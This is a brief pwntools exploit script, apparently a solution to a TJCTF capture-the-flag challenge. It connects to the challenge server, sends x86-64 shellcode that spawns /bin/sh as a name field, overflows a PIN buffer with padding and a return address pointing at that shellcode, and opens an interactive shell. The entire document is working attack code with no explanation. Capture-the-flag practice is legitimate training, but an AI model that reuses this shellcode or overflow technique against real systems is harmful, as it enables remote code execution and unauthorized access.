from pwn import *

p = remote("problem1.tjctf.org", 8005)

print p.recvuntil("Name")
p.sendline("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")

print p.recvuntil("PIN")
p.sendline("AAAA")

print p.recvuntil("quit")
p.sendline("d")

print p.recvuntil("PIN")
p.sendline("A" * 17 + p64(0x6010a0))
print p.recvuntil(":")
p.sendline("AAAA")

p.interactive()
